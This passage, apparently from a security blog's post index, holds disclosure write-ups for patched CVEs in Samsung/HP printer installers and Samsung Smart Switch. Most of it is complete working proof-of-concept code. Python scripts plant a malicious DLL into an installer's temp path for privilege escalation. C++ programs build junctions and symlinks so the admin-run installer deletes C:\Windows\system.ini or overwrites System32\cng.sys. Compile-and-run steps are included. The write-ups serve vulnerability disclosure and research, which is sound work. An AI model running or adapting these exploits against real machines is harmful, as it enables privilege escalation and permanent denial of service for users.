USHORT Length; USHORT MaximumLength; PWSTR Buffer;} UNICODE_STRING;typedef UNICODE_STRING* PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG uLength; HANDLE hRootDirectory; PUNICODE_STRING pObjectName; ULONG uAttributes; PVOID pSecurityDescriptor; PVOID pSecurityQualityOfService;} OBJECT_ATTRIBUTES;typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information;} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;ULONG(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);ULONG(WINAPI* _RtlNtStatusToDosError)(NTSTATUS Status);NTSTATUS(WINAPI* _NtCreateFile)( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)( OUT PHANDLE pHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PUNICODE_STRING DestinationName);NTSTATUS(WINAPI* _NtClose)( HANDLE Handle );NtDefine.h# python 3.8.2import osimport shutilimport getpassUSER_NAME = getpass.getuser()LOG_FILE = f'C:\\\\Users\\\\{USER_NAME}\\\\AppData\\\\Local\\\\Temp\\\\SamsungPrinterInstaller.exe.log'DLL_NAME = 'DPAPI.DLL'def checkFile(path : str) -&gt; str: while True: if os.path.exists(path): try: with open(path, 'r', encoding='utf-16le') as f: data = f.read() slice_index = data.rfind(r'Latest_WIA\\SPNTInst.exe') if slice_index == -1: continue slice_data = data[:slice_index + len('Latest_WIA')] temp_path = slice_data[data.find('= [')+3:] return temp_path except: continueif __name__ == '__main__': if os.path.exists(LOG_FILE): os.remove(LOG_FILE) temp_path = checkFile(LOG_FILE) print('[+] Found Log File') dll_path = temp_path dll_path += '\\\\' + DLL_NAME shutil.copy(DLL_NAME, dll_path) print('[+] DLL Copy Success')poc_Samsung Printer Setup Program.py# python 3.8.2import osimport shutilimport getpassUSER_NAME = getpass.getuser()LOG_FILE = f'C:\\\\Users\\\\{USER_NAME}\\\\AppData\\\\Local\\\\Temp\\\\RemoteDiagnosis.exe.log'DLL_NAME = 'cscapi.dll'def checkFile(path : str) -&gt; str: while True: if os.path.exists(path): try: with open(path, 'r', encoding='utf-16le') as f: data = f.read() slice_index = data.rfind(r'Latest_Universal\\setup.ex') if slice_index == -1: continue slice_data = data[:slice_index + len('Latest_Universal')] temp_path = slice_data[data.find('= [')+3:] return temp_path except: continueif __name__ == '__main__': if os.path.exists(LOG_FILE): os.remove(LOG_FILE) temp_path = checkFile(LOG_FILE) print('[+] Found Log File') dll_path = temp_path dll_path += '\\\\' + DLL_NAME shutil.copy(DLL_NAME, dll_path) print('[+] DLL Copy Success')poc_Samsung Printer Diagnostics.py Use Visual Studio 2022. Compile the project in the exploit directory in x86 Release mode. Rename the compiled dll to {DLL_NAME} and place it in the same directory as poc.py(Only when necessary). Run poc.py(Only when necessary) Run Installer File.0x06: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x07: TimeLine 2022/09/01 : First time contacted via Samsung Mobile Security. 2022/09/01 : I received a response stating that this vulnerabilities are managed by HP. 2022/09/18 : I reported vulnerabilities to HP. 2023/08/02 : The vulnerabilities have been patched, and CVE-2022-4894(PSR-2022-0147) has been issued.0x08: Reference https://support.hp.com/us-en/document/ish_8947379-8947403-16/hpsbpi03857 https://nvd.nist.gov/vuln/detail/CVE-2022-4894" }, { "title": "CVE-2023-30673: Possible to delete arbitrary directory vulnerability in Smart Switch PC", "url": "/posts/CVE-2023-30673-Possible-to-delete-arbitrary-directory-vulnerability-in-Smart-Switch-PC/", "categories": "0-day", "tags": "Samsung, 0-day, CVE, CVE-2023-30673, EoP, DoS, Mitre", "date": "2023-07-28 00:00:00 +0900", "snippet": "0x01: Details Title: Possible to delete arbitrary directory vulnerability in Smart Switch PC CVE ID: CVE-2023-30673 Vendor ID : SVE-2023-0312 Advisory Published: 2023/07/06 Advisory URL : https://security.samsungmobile.com/serviceWeb.smsb?year=2023&amp;month=070x02: Test Environment Samsung Smart Switch for Windows : 4.3.23022_1 OS : Windows 10 Pro 64-bit 21H2 (build 19045.2604)0x03: Vulnerability detailsImproper validation of integrity check vulnerability in Smart Switch PC prior to version 4.3.23052_1 allows local attackers to delete arbitrary directory using directory junction.The patch prevents directory junction in the directory used during installation process.0x04: Technical descriptionThe Samsung Smart Switch installer operates with administrator privileges and deletes the C:\\Users\\%Username%\\AppData\\Roaming\\Samsung\\Smart Switch PC\\CRMData.db file during the installation process. Since the path of this file is accessible to normal users, an attacker can delete any file by exploiting administrative privileges through a symbolic link.Note: %Username% must be replaced with the account name of the user logged into Windows.0x05: Proof-of-Concept (PoC)#define _CRT_SECURE_NO_WARNINGS#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;wchar.h&gt;#include &lt;string&gt;#include \"NtDefine.h\"DWORD LastError = 0;void SetLastErr(DWORD err) {\tLastError = err;}std::wstring BuildNativePath(std::wstring path) {\tif (path.rfind(L\"\\\\\", 0) != std::wstring::npos) {\t\treturn path;\t}\tpath = L\"\\\\??\\\\\" + path;\treturn path;}HANDLE OpenDirectory(std::wstring directory, DWORD access_mask, DWORD share_mode, DWORD creation_disposition) {\tdirectory = BuildNativePath(directory);\tHANDLE h;\tOBJECT_ATTRIBUTES objattr;\tUNICODE_STRING target;\tIO_STATUS_BLOCK io;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;target, directory.c_str());\tInitializeObjectAttributes(&amp;objattr, &amp;target, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tswitch (creation_disposition) {\tcase CREATE_NEW:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tcase OPEN_EXISTING:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tdefault:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t}\tif (status != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(status));\t\treturn NULL;\t}\treturn h;}bool CreateMountPoint(std::wstring dir, std::wstring target, std::wstring printname) {\tHANDLE hdir = OpenDirectory(dir, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);\ttarget = BuildNativePath(target);\tsize_t targetsz = target.size() * 2;\tsize_t printnamesz = printname.size() * 2;\tsize_t pathbuffersz = targetsz + printnamesz + 12;\tsize_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;\tREPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);\tmemset(rdb, 0, totalsz);\trdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\trdb-&gt;ReparseDataLength = static_cast&lt;USHORT&gt;(pathbuffersz);\trdb-&gt;Reserved = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameOffset = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameLength = static_cast&lt;USHORT&gt;(targetsz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameOffset = static_cast&lt;USHORT&gt;(targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameLength = static_cast&lt;USHORT&gt;(printnamesz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);\tDWORD cb = 0;\tbool ret = DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, nullptr, NULL, &amp;cb, NULL) == TRUE;\t_NtClose(hdir);\treturn ret;}HANDLE CreateNativeSymlink(std::wstring link, std::wstring target) {\tHANDLE ret;\tUNICODE_STRING ulnk;\tUNICODE_STRING utarget;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;ulnk, link.c_str());\t_RtlInitUnicodeString(&amp;utarget, target.c_str());\tOBJECT_ATTRIBUTES objattr;\tInitializeObjectAttributes(&amp;objattr, &amp;ulnk, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tNTSTATUS stat = _NtCreateSymbolicLinkObject(&amp;ret, SYMBOLIC_LINK_ALL_ACCESS,\t\t&amp;objattr, &amp;utarget);\tif (stat != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(stat));\t\treturn nullptr;\t}\treturn ret;}DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {\tHANDLE hSrch;\tWIN32_FIND_DATA wfd;\tDWORD res = 1;\tTCHAR DelPath[MAX_PATH];\tTCHAR FullPath[MAX_PATH];\tTCHAR TempPath[MAX_PATH];\tlstrcpy(DelPath, szDir);\tlstrcpy(TempPath, szDir);\tif (lstrcmp(DelPath + lstrlen(DelPath) - 4, L\"\\\\*.*\") != 0) {\t\tlstrcat(DelPath, L\"\\\\*.*\");\t}\thSrch = FindFirstFile(DelPath, &amp;wfd);\tif (hSrch == INVALID_HANDLE_VALUE) {\t\tif (recur &gt; 0) RemoveDirectory(TempPath);\t\treturn -1;\t}\twhile (res) {\t\twsprintf(FullPath, L\"%s\\\\%s\", TempPath, wfd.cFileName);\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY) {\t\t\tSetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);\t\t}\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) {\t\t\tif (lstrcmp(wfd.cFileName, L\".\")\t\t\t\t&amp;&amp; lstrcmp(wfd.cFileName, L\"..\")) {\t\t\t\trecur++;\t\t\t\tDeleteAllFiles(FullPath, recur);\t\t\t\trecur--;\t\t\t}\t\t}\t\telse {\t\t\tDeleteFile(FullPath);\t\t}\t\tres = FindNextFile(hSrch, &amp;wfd);\t}\tFindClose(hSrch);\tif (recur &gt; 0) RemoveDirectory(TempPath);\treturn 0;}void NtInit() {\tLoadLibrary(L\"ntdll.dll\");\tHMODULE hm = GetModuleHandle(L\"ntdll.dll\");\t_RtlInitUnicodeString = (ULONG(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(hm, \"RtlInitUnicodeString\");\t_RtlNtStatusToDosError = (ULONG(WINAPI*) (NTSTATUS Status))GetProcAddress(hm, \"RtlNtStatusToDosError\");\t_NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(\t\tOUT PHANDLE pHandle,\t\tIN ACCESS_MASK DesiredAccess,\t\tIN POBJECT_ATTRIBUTES ObjectAttributes,\t\tIN PUNICODE_STRING DestinationName))GetProcAddress(hm, \"NtCreateSymbolicLinkObject\");\t_NtCreateFile = (NTSTATUS(WINAPI*)(\t\tPHANDLE FileHandle,\t\tACCESS_MASK DesiredAccess,\t\tPOBJECT_ATTRIBUTES ObjectAttributes,\t\tPIO_STATUS_BLOCK IoStatusBlock,\t\tPLARGE_INTEGER AllocationSize,\t\tULONG FileAttributes,\t\tULONG ShareAccess,\t\tULONG CreateDisposition,\t\tULONG CreateOptions,\t\tPVOID EaBuffer,\t\tULONG EaLength))GetProcAddress(hm, \"NtCreateFile\");\t_NtClose = (NTSTATUS(WINAPI*)(HANDLE Handle))GetProcAddress(hm, \"NtClose\");}int main() {\tNtInit();\tstd::wstring UserProfilePath = std::wstring(_wgetenv(L\"USERPROFILE\"));\tstd::wstring LinkFile = L\"CRMData.db\";\tstd::wstring LinkDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Samsung\\\\Smart Switch PC\");\tstd::wstring TargetFile = L\"C:\\\\Windows\\\\system.ini\";\tstd::wstring RpcControl = L\"\\\\RPC Control\";\tstd::wstring RpcControlFile = RpcControl + L\"\\\\\" + LinkFile;\tstd::wstring ParentDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Samsung\");\tif (GetFileAttributesW(ParentDirectory.c_str()) != INVALID_FILE_ATTRIBUTES) {\t\tDeleteAllFiles(ParentDirectory.c_str(), 1);\t}\tCreateDirectoryW(ParentDirectory.c_str(), NULL);\tif (!CreateMountPoint(LinkDirectory, RpcControl, L\"Junction\")) {\t\tstd::cout &lt;&lt; \"[-] RPC Control Junction Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] RPC Control Junction Success\" &lt;&lt; std::endl;\tHANDLE hFile = CreateNativeSymlink(RpcControlFile, BuildNativePath(TargetFile));\tif (hFile == INVALID_HANDLE_VALUE || hFile == NULL) {\t\tstd::cout &lt;&lt; \"[-] CreateNativeSymlink Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] CreateNativeSymlink Success Handle : \" &lt;&lt; hFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"[+] CreateSymlink Success\" &lt;&lt; std::endl;\tstd::wcout &lt;&lt; L\"[+] \" &lt;&lt; (LinkDirectory + L\"\\\\\" + LinkFile) &lt;&lt; L\" -&gt; \" &lt;&lt; TargetFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"Press ENTER to exit and delete the symlink\" &lt;&lt; std::endl;\tgetchar();\treturn 0;}main.cpp#pragma once#include &lt;Windows.h&gt;#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)#define STATUS_SUCCESS 0x00000000#define OBJ_CASE_INSENSITIVE 0x00000040L#define \tFILE_OPEN 0x00000001#define \tFILE_OPEN_IF 0x00000003#define \tFILE_CREATE 0x00000002#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_OPEN_REPARSE_POINT 0x00200000#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE#define GENERIC_READ_WRITE GENERIC_READ|GENERIC_WRITE#define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)-&gt;uLength = sizeof( OBJECT_ATTRIBUTES ); \\ (p)-&gt;hRootDirectory = r; \\ (p)-&gt;uAttributes = a; \\ (p)-&gt;pObjectName = n; \\ (p)-&gt;pSecurityDescriptor = s; \\ (p)-&gt;pSecurityQualityOfService = NULL; \\}typedef struct _REPARSE_DATA_BUFFER { ULONG ReparseTag; USHORT ReparseDataLength; USHORT Reserved; union { struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; ULONG Flags; WCHAR PathBuffer[1]; } SymbolicLinkReparseBuffer; struct { USHORT SubstituteNameOffset; USHORT SubstituteNameLength; USHORT PrintNameOffset; USHORT PrintNameLength; WCHAR PathBuffer[1]; } MountPointReparseBuffer; struct { UCHAR DataBuffer[1]; } GenericReparseBuffer; } DUMMYUNIONNAME;} REPARSE_DATA_BUFFER, * PREPARSE_DATA_BUFFER;typedef struct _FILE_DISPOSITION_INFORMATION_EX { ULONG Flags;} FILE_DISPOSITION_INFORMATION_EX, * PFILE_DISPOSITION_INFORMATION_EX;#define REPARSE_DATA_BUFFER_HEADER_LENGTH FIELD_OFFSET(REPARSE_DATA_BUFFER, GenericReparseBuffer.DataBuffer)typedef struct _UNICODE_STRING { USHORT Length; USHORT MaximumLength; PWSTR Buffer;} UNICODE_STRING;typedef UNICODE_STRING* PUNICODE_STRING;typedef struct _OBJECT_ATTRIBUTES { ULONG uLength; HANDLE hRootDirectory; PUNICODE_STRING pObjectName; ULONG uAttributes; PVOID pSecurityDescriptor; PVOID pSecurityQualityOfService;} OBJECT_ATTRIBUTES;typedef OBJECT_ATTRIBUTES* POBJECT_ATTRIBUTES;typedef struct _IO_STATUS_BLOCK { union { NTSTATUS Status; PVOID Pointer; }; ULONG_PTR Information;} IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;ULONG(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING, PCWSTR);ULONG(WINAPI* _RtlNtStatusToDosError)(NTSTATUS Status);NTSTATUS(WINAPI* _NtCreateFile)( PHANDLE FileHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PIO_STATUS_BLOCK IoStatusBlock, PLARGE_INTEGER AllocationSize, ULONG FileAttributes, ULONG ShareAccess, ULONG CreateDisposition, ULONG CreateOptions, PVOID EaBuffer, ULONG EaLength);NTSTATUS(WINAPI* _NtCreateSymbolicLinkObject)( OUT PHANDLE pHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PUNICODE_STRING DestinationName);NTSTATUS(WINAPI* _NtClose)( HANDLE Handle );NtDefine.h Use Visual Studio 2022. Compile the project in the exploit directory in x86 Release mode. Run exploit.exe. Run Smart Switch PC_4.3.23022_1.exe to perform Samsung Smart Switch installation.0x06: Affected ProductsThis vulnerability affects the following product: Smart Switch PC &lt; 4.3.23052_10x07: Credit informationHeeChan Kim (@heegong123) of TeamH4C0x08: TimeLine 2023/02/23 : First time contacted via Samsung Mobile Security. 2023/02/23 : I received a call from Samsung Mobile Security to analyze the vulnerability. 2023/03/10 : I received a call from Samsung Mobile Security to determine the vulnerability as moderate and proceed with the patch. 2023/07/06 : The vulnerability has been patched, and CVE-2023-30673(SVE-2023-0312) has been issued.0x09: Reference https://security.samsungmobile.com/serviceWeb.smsb?year=2023&amp;month=07 https://nvd.nist.gov/vuln/detail/CVE-2023-30673" }, { "title": "CVE-2023-30672: Improper privilege management vulnerability in Samsung Smart Switch for Windows Installer", "url": "/posts/CVE-2023-30672-Improper-privilege-management-vulnerability-in-Samsung-Smart-Switch-for-Windows-Installer/", "categories": "0-day", "tags": "Samsung, 0-day, CVE, CVE-2023-30672, EoP, DoS, Mitre", "date": "2023-07-27 00:00:00 +0900", "snippet": "0x01: Details Title: Improper privilege management vulnerability in Samsung Smart Switch for Windows Installer CVE ID: CVE-2023-30672 Vendor ID : SVE-2023-0310 Advisory Published: 2023/07/06 Advisory URL : https://security.samsungmobile.com/serviceWeb.smsb?year=2023&amp;month=070x02: Test Environment Samsung Smart Switch for Windows : 4.3.23022_1 OS : Windows 10 Pro 64-bit 21H2 (build 19045.2604)0x03: Vulnerability detailsImproper privilege management vulnerability in Samsung Smart Switch for Windows Installer prior to version 4.3.23043_3 allows attackers to cause permanent DoS via directory junction.0x04: Technical descriptionThe Samsung Smart Switch installer operates with Administrator privileges. During the installation process, the installer creates an Smart Switch.lnk file in the C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch directory. At this time, the path C:\\Users\\%Username%\\AppData\\Roaming\\Microsoft\\Internet Explorer\\Quick Launch\\Smart Switch.lnk can be accessed even by normal users, so by creating a symbolic link to C:\\Windows\\System32\\cng.sys, the administrator’s authority exploits an Arbitrary file creation vulnerability. At this time, if the cng.sys file is written in the C:\\Windows\\System32 directory, the permanent Denial-of-Service vulnerability occurs.Note: %Username% must be replaced with the account name of the user logged into Windows.0x05: Proof-of-Concept (PoC)#define _CRT_SECURE_NO_WARNINGS#include &lt;iostream&gt;#include &lt;windows.h&gt;#include &lt;wchar.h&gt;#include &lt;string&gt;#include \"NtDefine.h\"DWORD LastError = 0;void SetLastErr(DWORD err) {\tLastError = err;}std::wstring BuildNativePath(std::wstring path) {\tif (path.rfind(L\"\\\\\", 0) != std::wstring::npos) {\t\treturn path;\t}\tpath = L\"\\\\??\\\\\" + path;\treturn path;}HANDLE OpenDirectory(std::wstring directory, DWORD access_mask, DWORD share_mode, DWORD creation_disposition) {\tdirectory = BuildNativePath(directory);\tHANDLE h;\tOBJECT_ATTRIBUTES objattr;\tUNICODE_STRING target;\tIO_STATUS_BLOCK io;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;target, directory.c_str());\tInitializeObjectAttributes(&amp;objattr, &amp;target, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tswitch (creation_disposition) {\tcase CREATE_NEW:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_CREATE, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tcase OPEN_EXISTING:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t\tbreak;\tdefault:\t\tstatus = _NtCreateFile(&amp;h, access_mask, &amp;objattr, &amp;io, NULL, FILE_ATTRIBUTE_NORMAL, share_mode,\t\t\tFILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_OPEN_REPARSE_POINT, NULL, NULL);\t}\tif (status != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(status));\t\treturn NULL;\t}\treturn h;}bool CreateMountPoint(std::wstring dir, std::wstring target, std::wstring printname) {\tHANDLE hdir = OpenDirectory(dir, GENERIC_WRITE, ALL_SHARING, OPEN_ALWAYS);\ttarget = BuildNativePath(target);\tsize_t targetsz = target.size() * 2;\tsize_t printnamesz = printname.size() * 2;\tsize_t pathbuffersz = targetsz + printnamesz + 12;\tsize_t totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;\tREPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)_malloca(totalsz);\tmemset(rdb, 0, totalsz);\trdb-&gt;ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;\trdb-&gt;ReparseDataLength = static_cast&lt;USHORT&gt;(pathbuffersz);\trdb-&gt;Reserved = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameOffset = NULL;\trdb-&gt;MountPointReparseBuffer.SubstituteNameLength = static_cast&lt;USHORT&gt;(targetsz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer, target.c_str(), targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameOffset = static_cast&lt;USHORT&gt;(targetsz + 2);\trdb-&gt;MountPointReparseBuffer.PrintNameLength = static_cast&lt;USHORT&gt;(printnamesz);\tmemcpy(rdb-&gt;MountPointReparseBuffer.PathBuffer + target.size() + 1, printname.c_str(), printnamesz + 2);\tDWORD cb = 0;\tbool ret = DeviceIoControl(hdir, FSCTL_SET_REPARSE_POINT, rdb, totalsz, nullptr, NULL, &amp;cb, NULL) == TRUE;\t_NtClose(hdir);\treturn ret;}HANDLE CreateNativeSymlink(std::wstring link, std::wstring target) {\tHANDLE ret;\tUNICODE_STRING ulnk;\tUNICODE_STRING utarget;\tNTSTATUS status;\t_RtlInitUnicodeString(&amp;ulnk, link.c_str());\t_RtlInitUnicodeString(&amp;utarget, target.c_str());\tOBJECT_ATTRIBUTES objattr;\tInitializeObjectAttributes(&amp;objattr, &amp;ulnk, OBJ_CASE_INSENSITIVE, nullptr, nullptr);\tNTSTATUS stat = _NtCreateSymbolicLinkObject(&amp;ret, SYMBOLIC_LINK_ALL_ACCESS,\t\t&amp;objattr, &amp;utarget);\tif (stat != STATUS_SUCCESS) {\t\tSetLastErr(_RtlNtStatusToDosError(stat));\t\treturn nullptr;\t}\treturn ret;}DWORD DeleteAllFiles(LPCWSTR szDir, DWORD recur) {\tHANDLE hSrch;\tWIN32_FIND_DATA wfd;\tDWORD res = 1;\tTCHAR DelPath[MAX_PATH];\tTCHAR FullPath[MAX_PATH];\tTCHAR TempPath[MAX_PATH];\tlstrcpy(DelPath, szDir);\tlstrcpy(TempPath, szDir);\tif (lstrcmp(DelPath + lstrlen(DelPath) - 4, L\"\\\\*.*\") != 0) {\t\tlstrcat(DelPath, L\"\\\\*.*\");\t}\thSrch = FindFirstFile(DelPath, &amp;wfd);\tif (hSrch == INVALID_HANDLE_VALUE) {\t\tif (recur &gt; 0) RemoveDirectory(TempPath);\t\treturn -1;\t}\twhile (res) {\t\twsprintf(FullPath, L\"%s\\\\%s\", TempPath, wfd.cFileName);\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_READONLY) {\t\t\tSetFileAttributes(FullPath, FILE_ATTRIBUTE_NORMAL);\t\t}\t\tif (wfd.dwFileAttributes &amp; FILE_ATTRIBUTE_DIRECTORY) {\t\t\tif (lstrcmp(wfd.cFileName, L\".\")\t\t\t\t&amp;&amp; lstrcmp(wfd.cFileName, L\"..\")) {\t\t\t\trecur++;\t\t\t\tDeleteAllFiles(FullPath, recur);\t\t\t\trecur--;\t\t\t}\t\t}\t\telse {\t\t\tDeleteFile(FullPath);\t\t}\t\tres = FindNextFile(hSrch, &amp;wfd);\t}\tFindClose(hSrch);\tif (recur &gt; 0) RemoveDirectory(TempPath);\treturn 0;}void NtInit() {\tLoadLibrary(L\"ntdll.dll\");\tHMODULE hm = GetModuleHandle(L\"ntdll.dll\");\t_RtlInitUnicodeString = (ULONG(WINAPI*)(PUNICODE_STRING, PCWSTR))GetProcAddress(hm, \"RtlInitUnicodeString\");\t_RtlNtStatusToDosError = (ULONG(WINAPI*) (NTSTATUS Status))GetProcAddress(hm, \"RtlNtStatusToDosError\");\t_NtCreateSymbolicLinkObject = (NTSTATUS(WINAPI*)(\t\tOUT PHANDLE pHandle,\t\tIN ACCESS_MASK DesiredAccess,\t\tIN POBJECT_ATTRIBUTES ObjectAttributes,\t\tIN PUNICODE_STRING DestinationName))GetProcAddress(hm, \"NtCreateSymbolicLinkObject\");\t_NtCreateFile = (NTSTATUS(WINAPI*)(\t\tPHANDLE FileHandle,\t\tACCESS_MASK DesiredAccess,\t\tPOBJECT_ATTRIBUTES ObjectAttributes,\t\tPIO_STATUS_BLOCK IoStatusBlock,\t\tPLARGE_INTEGER AllocationSize,\t\tULONG FileAttributes,\t\tULONG ShareAccess,\t\tULONG CreateDisposition,\t\tULONG CreateOptions,\t\tPVOID EaBuffer,\t\tULONG EaLength))GetProcAddress(hm, \"NtCreateFile\");\t_NtClose = (NTSTATUS(WINAPI*)(HANDLE Handle))GetProcAddress(hm, \"NtClose\");}int main() {\tNtInit();\tstd::wstring UserProfilePath = std::wstring(_wgetenv(L\"USERPROFILE\"));\tstd::wstring LinkFile = L\"Smart Switch.lnk\";\tstd::wstring LinkDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\\\\Quick Launch\");\tstd::wstring TargetFile = L\"C:\\\\Windows\\\\System32\\\\cng.sys\";\tstd::wstring RpcControl = L\"\\\\RPC Control\";\tstd::wstring RpcControlFile = RpcControl + L\"\\\\\" + LinkFile;\tstd::wstring ParentDirectory = UserProfilePath + std::wstring(L\"\\\\AppData\\\\Roaming\\\\Microsoft\\\\Internet Explorer\");\tif (GetFileAttributesW(ParentDirectory.c_str()) != INVALID_FILE_ATTRIBUTES) {\t\tDeleteAllFiles(ParentDirectory.c_str(), 1);\t}\tCreateDirectoryW(ParentDirectory.c_str(), NULL);\tif (!CreateMountPoint(LinkDirectory, RpcControl, L\"Junction\")) {\t\tstd::cout &lt;&lt; \"[-] RPC Control Junction Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] RPC Control Junction Success\" &lt;&lt; std::endl;\tHANDLE hFile = CreateNativeSymlink(RpcControlFile, BuildNativePath(TargetFile));\tif (hFile == INVALID_HANDLE_VALUE || hFile == NULL) {\t\tstd::cout &lt;&lt; \"[-] CreateNativeSymlink Failed\" &lt;&lt; std::endl;\t\texit(0);\t}\tstd::cout &lt;&lt; \"[+] CreateNativeSymlink Success Handle : \" &lt;&lt; hFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"[+] CreateSymlink Success\" &lt;&lt; std::endl;\tstd::wcout &lt;&lt; L\"[+] \" &lt;&lt; (LinkDirectory + L\"\\\\\" + LinkFile) &lt;&lt; L\" -&gt; \" &lt;&lt; TargetFile &lt;&lt; std::endl;\tstd::cout &lt;&lt; \"Press ENTER to exit and delete the symlink\" &lt;&lt; std::endl;\tgetchar();\treturn 0;}main.cpp#pragma once#include &lt;Windows.h&gt;#define SYMBOLIC_LINK_ALL_ACCESS (STANDARD_RIGHTS_REQUIRED | 0x1)#define STATUS_SUCCESS 0x00000000#define OBJ_CASE_INSENSITIVE 0x00000040L#define \tFILE_OPEN 0x00000001#define \tFILE_OPEN_IF 0x00000003#define \tFILE_CREATE 0x00000002#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_DIRECTORY_FILE 0x00000001#define \tFILE_OPEN_REPARSE_POINT 0x00200000#define ALL_SHARING FILE_SHARE_READ|FILE_SHARE_WRITE|FILE_SHARE_DELETE#define GENERIC_READ_WRITE GENERIC_READ|GENERIC_WRITE#define InitializeObjectAttributes( p, n, a, r, s ) { \\ (p)-&gt;uLength = sizeof( OBJECT_ATTRIBUTES ); \\ (p)-&gt;hRootDirectory = r; \\ (p)-&gt;uAttributes = a; \\ (p)-&gt;pObjectName = n; \\ (p)-&gt;pSecurityDescriptor = 